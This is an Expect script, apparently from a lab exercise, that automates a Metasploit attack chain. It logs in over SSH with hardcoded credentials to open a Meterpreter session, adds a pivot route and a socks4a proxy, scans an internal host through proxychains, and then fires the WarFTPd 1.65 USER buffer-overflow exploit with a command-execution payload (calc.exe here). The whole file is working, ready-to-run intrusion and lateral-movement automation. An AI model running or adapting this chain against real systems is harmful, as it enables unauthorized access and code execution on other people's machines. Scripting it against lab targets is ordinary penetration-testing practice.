#!/usr/bin/expect -f
#
# This Expect script was generated by autoexpect on Sat Apr 11 21:10:59 2020
# Expect and autoexpect were both written by Don Libes, NIST.
#
# Note that autoexpect does not guarantee a working script.  It
# necessarily has to guess about certain things.  Two reasons a script
# might fail are:
#
# 1) timing - A surprising number of programs (rn, ksh, zsh, telnet,
# etc.) and devices discard or ignore keystrokes that arrive "too
# quickly" after prompts.  If you find your new script hanging up at
# one spot, try adding a short sleep just before the previous send.
# Setting "force_conservative" to 1 (see below) makes Expect do this
# automatically - pausing briefly before sending each character.  This
# pacifies every program I know of.  The -c flag makes the script do
# this in the first place.  The -C flag allows you to define a
# character to toggle this mode off and on.

set force_conservative 0  ;# set to 1 to force conservative mode even if
			  ;# script wasn't run conservatively originally
if {$force_conservative} {
	set send_slow {1 .1}
	proc send {ignore arg} {
		sleep .1
		exp_send -s -- $arg
	}
}

#
# 2) differing output - Some programs produce different output each time
# they run.  The "date" command is an obvious example.  Another is
# ftp, if it produces throughput statistics at the end of a file
# transfer.  If this causes a problem, delete these patterns or replace
# them with wildcards.  An alternative is to use the -p flag (for
# "prompt") which makes Expect only look for the last line of output
# (i.e., the prompt).  The -P flag allows you to define a character to
# toggle this mode off and on.
#
# Read the man page for more info.
#
# -Don


set timeout -1
spawn ./warftp-proxy
match_max 100000

expect  "*Starting Nmap*Nmap done*which IP to target for the ssh pivoting attack?*"
send -- "10.0.4.2\r"

expect "*Starting the Metasploit Framework*mmsf5\[0m \[0m> "
send -- "use exploit/multi/ssh/sshexec\r"

expect "*msf5\[0m exploit(\[1m\[31mmulti/ssh/sshexec\[0m) \[0m> "
send -- "set rhosts 10.0.4.2\r"

expect "*rhosts 10.0.4.2*mmsf5\[0m exploit(\[1m\[31mmulti/ssh/sshexec\[0m) \[0m> "
send -- "set username kcameron\r"

expect "*username => kcameron\r
\[4mmsf5\[0m exploit(\[1m\[31mmulti/ssh/sshexec\[0m) \[0m> "
send -- "set password kcameron\r"

expect "*password => kcameron\r
\[4mmsf5\[0m exploit(\[1m\[31mmulti/ssh/sshexec\[0m) \[0m> "
send -- "exploit\r"


expect "**Meterpreter session*opened*10.0.4.2*> "
send -- "background\r"

expect "Backgrounding session*mmulti/ssh/sshexec\[0m) \[0m> "
send -- "route add 10.0.0.0 255.255.0.0 1\r"

expect "*Route added\r
\[4mmsf5\[0m exploit(\[1m\[31mmulti/ssh/sshexec\[0m) \[0m> "
send -- "use auxiliary/server/socks4a\r"

expect "*auxiliary(\[1m\[31mserver/socks4a\[0m) \[0m> "
send -- "set srvport 9050\r"

expect "*srvport => 9050\r
\[4mmsf5\[0m auxiliary(\[1m\[31mserver/socks4a\[0m) \[0m> "
send -- "run -j\r"

expect "*Starting the socks4a proxy server*auxiliary(\[1m\[31mserver/socks4a\[0m) \[0m> "
send -- "proxychains nmap -sV -Pn -T4 -sT -n -p 21 10.0.16.10\r"

expect "*proxychains nmap*WAR-FTPD 1.65 (Name Jgaa's Fan Club FTP Service)\r
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows*msf5\[0m auxiliary(\[1m\[31mserver/socks4a\[0m) \[0m> "
send -- "search warftp\r"


expect "*exploit/windows/ftp/warftpd_165_user*msf5\[0m auxiliary(\[1m\[31mserver/socks4a\[0m) \[0m> "
send -- "use exploit/windows/ftp/warftpd_165_user\r"

expect "*use exploit/windows/ftp/warftpd_165_user*exploit(\[1m\[31mwindows/ftp/warftpd_165_user\[0m) \[0m> "
send -- "set rhosts 10.0.16.10\r"

expect "*set rhosts 10.0.16.10*mmsf5\[0m exploit(\[1m\[31mwindows/ftp/warftpd_165_user\[0m) \[0m> "
send -- "set target 2\r"

expect "set target 2*mmsf5\[0m exploit(\[1m\[31mwindows/ftp/warftpd_165_user\[0m) \[0m> "
send -- "set payload windows/exec\r"

expect "set payload windows/exec*0mpayload => windows/exec\r
\[4mmsf5\[0m exploit(\[1m\[31mwindows/ftp/warftpd_165_user\[0m) \[0m> "
send -- "set cmd calc.exe\r"

expect "set cmd calc.exe*calc.exe\r
\[4mmsf5\[0m exploit(\[1m\[31mwindows/ftp/warftpd_165_user\[0m) \[0m> "
send -- "exploit\r"

expect eof
